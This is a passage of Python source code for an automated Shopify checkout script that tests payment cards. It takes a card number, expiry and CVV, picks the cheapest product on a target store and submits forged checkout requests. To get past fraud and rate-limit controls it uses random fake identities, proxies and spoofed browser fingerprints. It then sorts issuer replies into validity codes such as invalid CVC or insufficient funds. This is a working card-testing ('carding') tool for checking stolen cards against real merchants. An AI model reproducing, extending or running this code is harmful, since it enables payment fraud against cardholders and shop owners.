    return val if val else None


def _extract_sst(text: str, headers: dict) -> Optional[str]:
    """Try every known pattern to pull the Shopify checkout session token."""
    for key in ("X-Checkout-One-Session-Token", "x-checkout-one-session-token"):
        if key in headers:
            return headers[key]
    patterns = [
        ('name="serialized-sessionToken" content="&quot;', "&quot;"),
        ('name="serialized-sessionToken" content="', '"'),
        ('"serializedSessionToken":"',   '"'),
        ('"sessionToken":"',             '"'),
        ("sessionToken&quot;:&quot;",   "&quot;"),
        ('data-session-token="',         '"'),
        ('"checkout_session_token":"',   '"'),
    ]
    for s, e in patterns:
        val = _extract(text, s, e)
        if val and len(val) > 10:
            return val
    return None


def _normalize_response(raw: Optional[str]) -> str:
    """Map raw Shopify / aiohttp error text to a standard code."""
    if not raw:
        return "CARD_DECLINED"
    msg = str(raw).upper()

    if any(k in msg for k in ("ORDER_PLACED", "PROCESSEDRECEIPT", "PAYMENT_COMPLETE", "ORDER_CREATED", "SUBMITSUCCESS")):
        return "ORDER_PLACED"
    if any(k in msg for k in ("ACTION_REQUIRED", "ACTIONREQUIRED", "3DS", "OTP",
                               "REDIRECT_TO_3DS", "COMPLETE_PAYMENT", "CHALLENGE",
                               "AUTHENTICATION_REQUIRED", "AUTHENTICATION_FAILED",
                               "THREEDSSECURE", "THREE_D_SECURE", "3D_SECURE",
                               "SCA_REQUIRED", "3DS_FAILED", "CONFIRMATION_REJECTED")):
        return "3DS_REQUIRED"
    if any(k in msg for k in ("INVALID_CVC", "INVALID_SECURITY_CODE", "CVC_FAILURE",
                               "SECURITY_CODE", "CVV_FAILURE", "INCORRECT_CVC",
                               "CVC_CHECK_FAILED", "CVV_CHECK_FAILED")):
        return "INVALID_CVC"
    if any(k in msg for k in ("DO_NOT_HONOR",)):
        return "DO_NOT_HONOR"
    if any(k in msg for k in ("INSUFFICIENT_FUNDS", "INSUFFICIENT",
                               "NOT_SUFFICIENT_FUNDS", "EXCEEDS_BALANCE")):
        return "INSUFFICIENT_FUNDS"
    if any(k in msg for k in ("EXPIRED", "EXPIRY", "INVALID_EXPIRY", "EXPIRATION")):
        return "EXPIRED_CARD"
    if any(k in msg for k in ("INCORRECT_ZIP", "ZIP_MISMATCH", "AVS_REJECTED", "AVS_FAILED", "INCORRECT_ADDRESS", "INVALID_BILLING_ADDRESS")):
        return "INCORRECT_ZIP"
    if any(k in msg for k in ("CALL_ISSUER", "REFER_TO_ISSUER", "CONTACT_ISSUER")):
        return "CALL_ISSUER"
    if any(k in msg for k in ("AMOUNT_TOO_LARGE", "TRANSACTION_LIMIT_EXCEEDED", "LIMIT_EXCEEDED")):
        return "LIMIT_EXCEEDED"
    if any(k in msg for k in ("FRAUD_SUSPECTED", "HIGH_RISK_FRAUD_SUSPECTED", "SUSPECTED_FRAUD", "RISK_HIGH", "MERCHANT_RULE")):
        return "HIGH_RISK"
    if any(k in msg for k in ("INVALID_NUMBER", "NO_SUCH_ISSUER", "INVALID_CARD",
                               "INCORRECT_NUMBER", "BAD_NUMBER", "INVALID_ACCOUNT",
                               "CARD_NOT_SUPPORTED", "INVALID_PAYMENT_METHOD")):
        return "INVALID_CARD"
    if any(k in msg for k in ("LOST", "STOLEN", "PICKUP", "RESTRICTED", "REVOCATION",
                               "PICKUP_CARD", "STOP_PAYMENT")):
        return "CARD_DECLINED"
    if any(k in msg for k in ("GENERIC_DECLINE", "TRANSACTION_NOT_ALLOWED",
                               "NOT_PERMITTED", "SERVICE_NOT_ALLOWED",
                               "TRY_AGAIN_LATER", "CARD_TESTING")):
        return "CARD_DECLINED"
    return "CARD_DECLINED"


def _parse_gql_errors(errors: list) -> str:
    for err in errors:
        for field in ("code", "nonLocalizedMessage", "localizedMessage",
                      "message", "localizedMessageHtml", "messageUntranslated"):
            raw = str(err.get(field) or "")
            if not raw:
                continue
            norm = _normalize_response(raw)
            if norm != "CARD_DECLINED":
                return norm
            upper = raw.upper()
            if any(k in upper for k in ("PAYMENT_DECLINED", "CARD_DECLINED",
                                         "CHARGE_DECLINED", "CARD_WAS_DECLINED",
                                         "FRAUD")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("CHECKOUT_ALREADY_COMPLETED", "ALREADY_ACCEPTED")):
                return "CARD_DECLINED"
            if any(k in upper for k in ("SESSION_EXPIRED", "SESSION_INVALID",
                                         "TOKEN_EXPIRED", "INVALID_SESSION")):
                return "SESSION_EXPIRED"
            if any(k in upper for k in ("LOGIN_REQUIRED", "ACCOUNT_REQUIRED",
                                         "CUSTOMER_DISABLED")):
                return "SITE_REQUIRES_LOGIN"
            if any(k in upper for k in ("OUT_OF_STOCK", "SOLD_OUT",
                                         "INVENTORY_CLAIM", "INVENTORY_RESERVATION")):
                return "NO_PRODUCT"
            if any(k in upper for k in ("THROTTLED", "RATE_LIMIT", "TOO_MANY_REQUESTS",
                                         "RATE_LIMITED", "RETRY_LATER")):
                return "THROTTLED"
    return "GRAPHQL_ERROR"


def _make_session(proxy_str: Optional[str]) -> tuple[AsyncSession, dict, bool]:
    profile = random.choice(BROWSER_PROFILES)
    proxy = _parse_proxy(proxy_str) if proxy_str else None
    proxies = {"http": proxy, "https": proxy} if proxy else None
    session = AsyncSession(impersonate=profile["impersonate"], timeout=REQUEST_TIMEOUT, proxies=proxies)
    return session, profile, True


# ---------------------------------------------------------------------------
# Product fetching with TTL cache
# ---------------------------------------------------------------------------
async def _fetch_products(
    base_url: str,
    proxy_str: Optional[str] = None,
    max_price: float = MAX_PRICE,
    max_retries: int = 3,
) -> tuple[Optional[dict], list[dict], Optional[str]]:
    """
    Returns (best_product, all_candidates_under_max_price, error_string).
    - Always sorts to find the cheapest product under MIN_PRICE-MAX_PRICE.
    - Retries 3 times on proxy/timeout errors.
    - Returns "PROXY_ERROR: ..." if proxy fails.
    """
    if not base_url.startswith("http"):
        base_url = "https://" + base_url

    hostname = urlparse(base_url).netloc
    now      = time.time()

    cached = _product_cache.get(hostname)
    if cached and not cached.get("err"):
        if (now - cached["ts"]) < CACHE_TTL:
            return cached.get("product"), cached.get("candidates", []), None

    nav_headers_default = {
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "none",
        "Sec-Fetch-User": "?1",
    }

    last_err = None

    for attempt in range(max_retries):
        session, profile, owned = _make_session(proxy_str)
        nav_headers = {
            "User-Agent": profile["ua"],
            **nav_headers_default,
            "Accept-Language": profile["accept_language"],
        }
        if profile.get("sec_ch_ua"):
            nav_headers["sec-ch-ua"] = profile["sec_ch_ua"]
            nav_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
            nav_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

        try:
            all_variants: list[dict] = []
            urls_to_try = [
                f"{base_url}/products.json?limit=250&sort_by=price-ascending",
                f"{base_url}/products.json?limit=250",
            ]
            for url in urls_to_try:
                try:
                    resp = await session.get(url, headers=nav_headers, allow_redirects=True)
                    if resp.status_code == 200:
                        data     = orjson.loads(resp.content)
                        products = data.get("products", [])
                        if products:
                            all_variants = products
                            break
                    elif resp.status_code in (429, 430):
                        last_err = "THROTTLED"
                        break
                except Exception:
                    continue

            if last_err == "THROTTLED":
                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res): await res
                return None, [], "THROTTLED"

            candidates: list[dict] = []
            best: Optional[dict]   = None
            best_price             = float("inf")

            if not all_variants:
                try:
                    import xml.etree.ElementTree as ET
                    sitemap_url = f"{base_url}/sitemap_products_1.xml"
                    smap_resp = await session.get(sitemap_url, allow_redirects=True)
                    if smap_resp.status_code == 200:
                        root = ET.fromstring(smap_resp.content)
                        urls = []
                        for child in root:
                            if child.tag.endswith('url'):
                                for loc in child:
                                    if loc.tag.endswith('loc'):
                                        urls.append(loc.text)

                        if urls:
                            sample_urls = random.sample(urls, min(25, len(urls)))
                            for purl in sample_urls:
                                try:
                                    p_resp = await session.get(purl, allow_redirects=True)
                                    matches = re.finditer(r'"id":(\d+).*?"inStock":true.*?,"price":([\d.]+)', p_resp.text)
                                    for m in matches:
                                        variant_id = m.group(1)
                                        price = float(m.group(2))
                                        if MIN_PRICE <= price <= MAX_PRICE:
                                            entry = {
                                                "site":       base_url,
                                                "price":      f"{price:.2f}",
                                                "price_f":    price,
                                                "variant_id": str(variant_id),
                                                "title":      "Product",
                                                "handle":     "",
                                            }
                                            candidates.append(entry)
                                            if price < best_price:
                                                best_price = price
                                                best       = entry
                                except Exception:
                                    pass
                except Exception:
                    pass

                if not candidates:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return None, [], "No products found"
            else:
                for product in all_variants:
                    p_title = str(product.get("title", "")).lower()
                    if any(bad in p_title for bad in ("tip", "donation", "gift card", "warranty", "route package", "insurance")):
                        continue
                    for variant in product.get("variants", []):
                        try:
                            avail = variant.get("available", True)
                            if avail is False:
                                continue
                            price = float(variant.get("price") or "0")
                        except (ValueError, TypeError):
                            continue
                        if price < MIN_PRICE or price > MAX_PRICE:
                            continue
                        entry = {
                            "site":       base_url,
                            "price":      f"{price:.2f}",
                            "price_f":    price,
                            "variant_id": str(variant["id"]),
                            "title":      product.get("title", "Product"),
                            "handle":     product.get("handle", ""),
                        }
                        candidates.append(entry)
                        if price < best_price:
                            best_price = price
                            best       = entry

            if not best:
                if owned:
                    res = session.close()
                    if asyncio.iscoroutine(res): await res
                return None, [], f"No products in {MIN_PRICE:.2f}-{MAX_PRICE:.2f} range"

            candidates.sort(key=lambda x: x["price_f"])
            _product_cache[hostname] = {"product": best, "candidates": candidates, "err": None, "ts": now}
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res): await res
            return best, candidates, None

        except (asyncio.TimeoutError, RequestsError) as ex:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res): await res
            err_msg = str(ex).lower()
            if "proxy" in err_msg or "tunnel" in err_msg:
                last_err = f"PROXY_ERROR: {str(ex)[:100]}"
            elif "timeout" in err_msg:
                last_err = f"TIMEOUT: {str(ex)[:100]}"
            else:
                last_err = f"NETWORK_ERROR: {str(ex)[:100]}"
            if attempt < max_retries - 1:
                await asyncio.sleep(0.5 * (attempt + 1))
                continue
            return None, [], last_err
        except Exception as ex:
            if owned:
                res = session.close()
                if asyncio.iscoroutine(res): await res
            return None, [], f"ERROR: {str(ex)[:100]}"

    return None, [], last_err or "UNKNOWN_ERROR"


# ---------------------------------------------------------------------------
# Core checkout validator
# ---------------------------------------------------------------------------
async def validate_card(
    cc:         str,
    month:      str,
    year:       str,
    cvv:        str,
    site_url:   str,
    variant_id: Optional[str] = None,
    proxy_str:  Optional[str] = None,
    max_retries: int = 3,
) -> dict:
    """
    Full Shopify checkout flow with retry + proxy error reporting.
    """
    t0       = time.time()
    gateway  = "UNKNOWN"
    price    = "0.00"
    currency = "USD"

    site_url = site_url.strip()
    ourl     = site_url if site_url.startswith("http") else f"https://{site_url}"
    hostname = urlparse(ourl).netloc

    def _r(response: str, charged: str = "False", approved: str = "False") -> dict:
        return {
            "Response": response,
            "CC":       f"{cc}|{month}|{year}|{cvv}",
            "Price":    price,
            "Gate":     gateway,
            "Site":     ourl,
            "Charged":  charged,
            "Approved": approved,
            "Time":     f"{round(time.time() - t0, 2)}s",
        }

    for outer_attempt in range(max_retries):
        sem = _site_semaphores[hostname]
        session, profile, owned = _make_session(proxy_str)

        async with sem:
            try:
                addr         = _pick_address(ourl)
                country_code = addr["countryCode"]
                first, last, email = _random_identity()
                phone  = addr["phone"]
                street = addr["address1"]
                city   = addr["city"]
                state  = addr["zoneCode"]
                s_zip  = addr["postalCode"]

                best, all_candidates, err = await _fetch_products(ourl, proxy_str)

                if err and ("PROXY_ERROR" in err or "TIMEOUT" in err or "NETWORK_ERROR" in err):
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    if outer_attempt < max_retries - 1:
                        await asyncio.sleep(0.5 * (outer_attempt + 1))
                        continue
                    return _r(err)

                if not best:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r(f"NO_PRODUCT: {err}")

                if not variant_id:
                    variant_id = best["variant_id"]
                    price      = best["price"]
                else:
                    matched = next(
                        (c for c in (all_candidates or []) if str(c.get("variant_id")) == str(variant_id)),
                        None,
                    )
                    if matched:
                        price = matched["price"]

                base_headers = {
                    "User-Agent":         profile["ua"],
                    "Accept":             "application/json, text/plain, */*",
                    "Accept-Language":    profile["accept_language"],
                    "Content-Type":       "application/json",
                    "Origin":             ourl,
                    "Referer":            f"{ourl}/",
                }
                if profile.get("sec_ch_ua"):
                    base_headers["sec-ch-ua"] = profile["sec_ch_ua"]
                    base_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                    base_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]

                cart_added = False
                for payload, ct in [
                    (f"id={variant_id}&quantity=1",
                     "application/x-www-form-urlencoded"),
                    (orjson.dumps({"items": [{"id": int(variant_id), "quantity": 1}]}),
                     "application/json"),
                ]:
                    try:
                        r = await session.post(
                            f"{ourl}/cart/add.js",
                            data=payload,
                            headers={**base_headers, "Content-Type": ct, "Accept": "application/json"},
                        )
                        if r.status_code == 200:
                            cart_added = True
                            break
                    except Exception:
                        continue

                if not cart_added:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    if outer_attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return _r("CART_FAILED")

                await asyncio.sleep(random.uniform(0.12, 0.35))

                try:
                    cr = await session.post(
                        f"{ourl}/checkout/",
                        allow_redirects=True,
                        headers={**base_headers,
                                 "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"},
                    )
                    checkout_url = str(cr.url)
                    page_text    = cr.text
                except (asyncio.TimeoutError, RequestsError):
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    if outer_attempt < max_retries - 1:
                        await asyncio.sleep(0.5)
                        continue
                    return _r("TIMEOUT")
                except Exception as ex:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r(f"CHECKOUT_FAILED: {type(ex).__name__}")

                lower_url = checkout_url.lower()
                if "login" in lower_url or "/account" in lower_url or "password" in lower_url:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("SITE_REQUIRES_LOGIN")

                m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
                if m:
                    attempt_token = m.group(1)
                else:
                    attempt_token = checkout_url.rstrip("/").split("/")[-1].split("?")[0]

                if not attempt_token or len(attempt_token) < 4:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("NO_ATTEMPT_TOKEN")

                sst = _extract_sst(page_text, dict(cr.headers))
                if not sst:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("NO_SESSION_TOKEN")

                queue_token = (
                    _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
                    _extract(page_text, '"queueToken":"', '"')
                )
                stable_id = (
                    _extract(page_text, 'stableId&quot;:&quot;', "&quot;") or
                    _extract(page_text, '"stableId":"', '"') or
                    "1"
                )

                merch_gid = (
                    _extract(page_text, "ProductVariantMerchandise/", "&quot;") or
                    _extract(page_text, "ProductVariantMerchandise/", '&q') or
                    _extract(page_text, '"merchandiseId":"gid://shopify/ProductVariantMerchandise/', '"') or
                    str(variant_id)
                )

                for s, e in [
                    ('currencyCode&quot;:&quot;', "&quot;"),
                    ('"currencyCode":"', '"'),
                ]:
                    val = _extract(page_text, s, e)
                    if val and len(val) == 3 and val.isalpha():
                        currency = val.upper()
                        break

                addr         = _pick_address(ourl, currency)
                country_code = addr["countryCode"]
                phone        = addr["phone"]
                street       = addr["address1"]
                city         = addr["city"]
                state        = addr["zoneCode"]
                s_zip        = addr["postalCode"]

                subtotal = (
                    _extract(page_text,
                             'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;',
                             "&quot;") or
                    _extract(page_text,
                             '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
                )
                if not subtotal:
                    m2 = re.search(r'"price":\s*"([\d.]+)"', page_text)
                    subtotal = m2.group(1) if m2 else "0.01"

                unescaped  = page_text.replace("&quot;", '"').replace("&amp;", "&")
                build_id   = None
                m3         = re.search(r'"commitSha"\s*:\s*"([a-f0-9]{40})"', unescaped)
                if m3:
                    build_id = m3.group(1)

                source_token = _extract(page_text, 'name="serialized-sourceToken" content="', '"')
                if source_token:
                    source_token = source_token.replace("&quot;", "").strip('"')

                ident_sig = None
                m4 = re.search(r'checkoutCardsinkCallerIdentificationSignature":"([^"]+)"', unescaped)
                if m4:
                    ident_sig = m4.group(1)

                graphql_url = f"https://{hostname}/checkouts/unstable/graphql"

                gql_headers = {
                    **base_headers,
                    "shopify-checkout-client":  "checkout-web/1.0",
                    "shopify-checkout-source":  f'id="{attempt_token}", type="cn"',
                    "x-checkout-one-session-token": sst,
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                }
                if build_id:
                    gql_headers["x-checkout-web-build-id"]     = build_id
                    gql_headers["x-checkout-web-deploy-stage"] = "production"
                if source_token:
                    gql_headers["x-checkout-web-source-id"] = source_token

                merch_id_full   = f"gid://shopify/ProductVariantMerchandise/{merch_gid}"
                variant_id_full = f"gid://shopify/ProductVariant/{variant_id}"

                def _base_vars() -> dict:
                    return {
                        "sessionInput":  {"sessionToken": sst},
                        "queueToken":    queue_token or "",
                        "discounts":     {"lines": [], "acceptUnexpectedDiscounts": True},
                        "delivery": {
                            "deliveryLines": [{
                                "destination": {
                                    "partialStreetAddress": {
                                        "address1": street, "address2": "", "city": city,
                                        "countryCode": country_code, "postalCode": s_zip,
                                        "firstName": first, "lastName": last,
                                        "zoneCode": state, "phone": phone,
                                    }
                                },
                                "selectedDeliveryStrategy": {
                                    "deliveryStrategyMatchingConditions": {
                                        "estimatedTimeInTransit": {"any": True},
                                        "shipments":              {"any": True},
                                    },
                                    "options": {},
                                },
                                "targetMerchandiseLines": {"any": True},
                                "deliveryMethodTypes":    ["SHIPPING"],
                                "expectedTotalPrice":     {"any": True},
                                "destinationChanged":     True,
                            }],
                            "noDeliveryRequired":          [],
                            "useProgressiveRates":         False,
                            "prefetchShippingRatesStrategy": None,
                            "supportsSplitShipping":       True,
                        },
                        "merchandise": {
                            "merchandiseLines": [{
                                "stableId": stable_id,
                                "merchandise": {
                                    "productVariantReference": {
                                        "id":               merch_id_full,
                                        "variantId":        variant_id_full,
                                        "properties":       [],
                                        "sellingPlanId":    None,
                                        "sellingPlanDigest": None,
                                    }
                                },
                                "quantity":             {"items": {"value": 1}},
                                "expectedTotalPrice":   {"value": {"amount": subtotal, "currencyCode": currency}},
                                "lineComponentsSource": None,
                                "lineComponents":       [],
                            }]
                        },
                        "payment": {
                            "totalAmount": {"any": True},
                            "paymentLines": [],
                            "billingAddress": {
                                "streetAddress": {
                                    "address1": "", "city": "", "countryCode": country_code,
                                    "lastName": "", "zoneCode": state, "phone": "",
                                }
                            },
                        },
                        "buyerIdentity": {
                            "customer":          {"presentmentCurrency": currency, "countryCode": country_code},
                            "email":             email,
                            "emailChanged":      False,
                            "phoneCountryCode":  country_code,
                            "marketingConsent":  [{"email": {"value": email}}],
                            "shopPayOptInPhone": {"countryCode": country_code},
                            "rememberMe":        False,
                        },
                        "tip":   {"tipLines": []},
                        "taxes": {
                            "proposedAllocations":         None,
                            "proposedTotalAmount":         {"value": {"amount": "0", "currencyCode": currency}},
                            "proposedTotalIncludedAmount": None,
                            "proposedMixedStateTotalAmount": None,
                            "proposedExemptions":          [],
                        },
                        "note":               {"message": None, "customAttributes": []},
                        "localizationExtension": {"fields": []},
                        "nonNegotiableTerms": None,
                        "scriptFingerprint":  {
                            "signature":             None, "signatureUuid":         None,
                            "lineItemScriptChanges": [], "paymentScriptChanges": [],
                            "shippingScriptChanges": [],
                        },
                        "optionalDuties": {"buyerRefusesDuties": False},
                        "deliveryExpectations": {"deliveryExpectationLines": []},
                        "memberships": {"memberships": []},
                        "cartMetafields": [],
                    }

                ship_vars      = _base_vars()
                resp_json: Any = None

                for attempt in range(3):
                    try:
                        r = await session.post(
                            graphql_url,
                            params={"operationName": "Proposal"},
                            headers=gql_headers,
                            json={"query": QUERY_PROPOSAL_SHIPPING, "variables": ship_vars,
                                  "operationName": "Proposal"},
                        )
                        resp_json = orjson.loads(r.content)
                    except (orjson.JSONDecodeError, asyncio.TimeoutError, RequestsError):
                        if attempt < 2:
                            await asyncio.sleep(1)
                        continue

                    data = resp_json.get("data", {}) or {}
                    if data.get("session"):
                        break

                    gql_errs = resp_json.get("errors", []) or []
                    if gql_errs:
                        interpreted = _parse_gql_errors(gql_errs)
                        if interpreted in ("SESSION_EXPIRED", "SITE_REQUIRES_LOGIN",
                                           "THROTTLED", "NO_PRODUCT"):
                            if owned:
                                res = session.close()
                                if asyncio.iscoroutine(res): await res
                            return _r(interpreted)
                        if attempt < 2:
                            await asyncio.sleep(1.5)
                            continue
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r(interpreted if interpreted != "GRAPHQL_ERROR"
                                  else "GRAPHQL_ERROR")

                if not resp_json or not (resp_json.get("data") or {}).get("session"):
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("GRAPHQL_ERROR")

                try:
                    _ship_sst = r.headers.get("x-checkout-one-session-token")
                    if _ship_sst:
                        sst = _ship_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                except Exception:
                    pass

                session_data = resp_json["data"]["session"]
                negotiate    = session_data.get("negotiate") or {}

                neg_errors = negotiate.get("errors") or []
                if neg_errors:
                    code = _parse_gql_errors(neg_errors)
                    if code != "GRAPHQL_ERROR":
                        if owned:
                            res = session.close()
                            if asyncio.iscoroutine(res): await res
                        return _r(code)

                result_obj  = negotiate.get("result") or {}
                result_type = result_obj.get("__typename", "")

                if result_type == "CheckpointDenied":
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("CHECKPOINTDENIED")
                if result_type in ("Throttled", "TooManyRequests"):
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("THROTTLED")
                if result_type == "NegotiationResultFailed":
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("NEGOTIATE_FAILED")

                checkpoint_data = result_obj.get("checkpointData")
                seller          = result_obj.get("sellerProposal") or {}

                if not seller:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("NO_SELLER_PROPOSAL")

                running_total_data = seller.get("runningTotal") or {}
                running_total      = running_total_data.get("value", {}).get("amount") or running_total_data.get("amount", "0")

                delivery_data     = seller.get("delivery") or {}
                delivery_strategy = ""
                shipping_amount   = 0.0
                if delivery_data.get("__typename") == "FilledDeliveryTerms":
                    d_lines = delivery_data.get("deliveryLines") or []
                    if d_lines:
                        strategies = d_lines[0].get("availableDeliveryStrategies") or []
                        if strategies:
                            delivery_strategy = strategies[0].get("handle", "")
                            try:
                                amt_data = strategies[0].get("amount") or {}
                                shipping_amount = float(
                                    amt_data.get("value", {}).get("amount") or amt_data.get("amount") or "0"
                                )
                            except (ValueError, TypeError):
                                shipping_amount = 0.0

                tax_data   = seller.get("tax") or {}
                tax_amount = 0.0
                if tax_data.get("__typename") == "FilledTaxTerms":
                    try:
                        tax_amt_data = tax_data.get("totalTaxAmount") or {}
                        tax_amount = float(
                            tax_amt_data.get("value", {}).get("amount") or tax_amt_data.get("amount") or "0"
                        )
                    except (ValueError, TypeError):
                        pass

                payment_data       = seller.get("payment") or {}
                payment_identifier = None
                if payment_data.get("__typename") == "FilledPaymentTerms":
                    avail_lines = payment_data.get("availablePaymentLines") or []
                    for line in avail_lines:
                        pm = line.get("paymentMethod") or {}
                        pid = pm.get("paymentMethodIdentifier")
                        if pid:
                            detected_gateway = (pm.get("extensibilityDisplayName") or
                                                pm.get("name") or pm.get("brand") or
                                                pm.get("displayName") or "Shopify Payments")
                            if "shopify" in detected_gateway.lower() and "payments" in detected_gateway.lower():
                                payment_identifier = pid
                                gateway = detected_gateway
                                price = f"{float(running_total) + shipping_amount + tax_amount:.2f}"
                                break

                if not payment_identifier:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("NO_SHOPIFY_PAYMENTS_GATEWAY")

                deliv_vars = copy.deepcopy(ship_vars)
                deliv_vars["sessionInput"]["sessionToken"] = sst

                deliv_vars["delivery"]["deliveryLines"][0].update({
                    "destination": {
                        "streetAddress": {
                            "address1": street, "address2": "", "city": city,
                            "countryCode": country_code, "postalCode": s_zip,
                            "firstName": first, "lastName": last,
                            "zoneCode": state, "phone": phone,
                        }
                    },
                    "selectedDeliveryStrategy": {
                        "deliveryStrategyByHandle": {
                            "handle": delivery_strategy, "customDeliveryRate": False
                        },
                        "options": {},
                    },
                    "targetMerchandiseLines": {"lines": [{"stableId": stable_id}]},
                    "expectedTotalPrice": {
                        "value": {"amount": str(shipping_amount), "currencyCode": currency}
                    },
                    "destinationChanged": False,
                })
                deliv_vars["payment"]["billingAddress"] = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                }
                deliv_vars["taxes"]["proposedTotalAmount"] = {
                    "value": {"amount": str(tax_amount), "currencyCode": currency}
                }
                deliv_vars["buyerIdentity"]["shopPayOptInPhone"] = {
                    "number": phone, "countryCode": country_code
                }
                if checkpoint_data:
                    deliv_vars["checkpointData"] = checkpoint_data

                try:
                    dr = await session.post(
                        graphql_url,
                        params={"operationName": "Proposal"},
                        headers=gql_headers,
                        json={"query": QUERY_PROPOSAL_DELIVERY, "variables": deliv_vars,
                              "operationName": "Proposal"},
                    )
                    d_resp = orjson.loads(dr.content)
                    _del_sst = dr.headers.get("x-checkout-one-session-token")
                    if _del_sst:
                        sst = _del_sst
                        gql_headers["x-checkout-one-session-token"] = sst
                    d_result = (
                        d_resp.get("data", {}).get("session", {})
                        .get("negotiate", {}).get("result", {})
                    )
                    if d_result:
                        d_typename = d_result.get("__typename", "")
                        if d_typename == "SubmittedForCompletion":
                            if owned:
                                res = session.close()
                                if asyncio.iscoroutine(res): await res
                            return _r("NO_PAYMENT_REQUIRED", charged="False", approved="False")
                        d_seller = d_result.get("sellerProposal") or {}
                        d_total  = d_seller.get("total") or d_seller.get("runningTotal") or {}
                        d_amt    = d_total.get("value", {}).get("amount") or d_total.get("amount")
                        if d_amt:
                            running_total = d_amt
                            try:
                                price = f"{float(running_total):.2f}"
                            except (ValueError, TypeError):
                                pass
                        d_delivery = d_seller.get("delivery") or {}
                        if d_delivery.get("__typename") == "FilledDeliveryTerms":
                            d_d_lines = d_delivery.get("deliveryLines") or []
                            if d_d_lines:
                                d_strategies = d_d_lines[0].get("availableDeliveryStrategies") or []
                                d_selected = d_d_lines[0].get("selectedDeliveryStrategy") or {}
                                if d_selected.get("handle"):
                                    delivery_strategy = d_selected["handle"]
                                elif d_strategies:
                                    delivery_strategy = d_strategies[0].get("handle", delivery_strategy)
                                if d_strategies:
                                    d_ship_amt = d_strategies[0].get("amount") or {}
                                    try:
                                        shipping_amount = float(
                                            d_ship_amt.get("value", {}).get("amount") or
                                            d_ship_amt.get("amount") or "0"
                                        )
                                    except (ValueError, TypeError):
                                        pass
                        d_tax = d_seller.get("tax") or {}
                        if d_tax.get("__typename") == "FilledTaxTerms":
                            d_tax_amt = d_tax.get("totalTaxAmount") or {}
                            try:
                                tax_amount = float(
                                    d_tax_amt.get("value", {}).get("amount") or
                                    d_tax_amt.get("amount") or "0"
                                )
                            except (ValueError, TypeError):
                                pass
                except Exception as ex:
                    log.debug("delivery proposal error: %s", ex)

                vault_payload = {
                    "credit_card": {
                        "number":             cc,
                        "month":              int(month),
                        "year":               int(f"20{year}"),
                        "verification_value": cvv,
                        "name":               f"{first} {last}",
                        "start_month":        None,
                        "start_year":         None,
                        "issue_number":       "",
                    },
                    "payment_session_scope": hostname,
                }
                vault_headers = {
                    "Content-Type":       "application/json",
                    "Accept":             "application/json",
                    "Accept-Language":    profile["accept_language"],
                    "Origin":             "https://checkout.pci.shopifyinc.com",
                    "User-Agent":         profile["ua"],
                }
                if profile.get("sec_ch_ua"):
                    vault_headers["sec-ch-ua-mobile"] = profile["sec_ch_ua_mobile"]
                    vault_headers["sec-ch-ua-platform"] = profile["sec_ch_ua_platform"]
                if ident_sig:
                    vault_headers["shopify-identification-signature"] = ident_sig

                vault_endpoints = [
                    "https://checkout.pci.shopifyinc.com/sessions",
                    "https://deposit.shopifyinc.com/sessions",
                ]
                token = None
                for vault_url in vault_endpoints:
                    try:
                        vr = await session.post(
                            vault_url, json=vault_payload,
                            headers=vault_headers,
                        )
                        vd = orjson.loads(vr.content)
                        token = vd.get("id")
                        if token:
                            break
                    except Exception:
                        continue

                if not token:
                    if owned:
                        res = session.close()
                        if asyncio.iscoroutine(res): await res
                    return _r("TOKENIZATION_FAILED")

                billing_addr = {
                    "streetAddress": {
                        "address1": street, "address2": "", "city": city,
                        "countryCode": country_code, "postalCode": s_zip,
                        "firstName": first, "lastName": last,
                        "zoneCode": state, "phone": phone,
                    }
                }

                def _build_submit_body() -> dict:
                    submit_deliv_line = copy.deepcopy(deliv_vars["delivery"]["deliveryLines"][0])
                    submit_deliv_line["selectedDeliveryStrategy"] = {
                        "deliveryStrategyByHandle": {
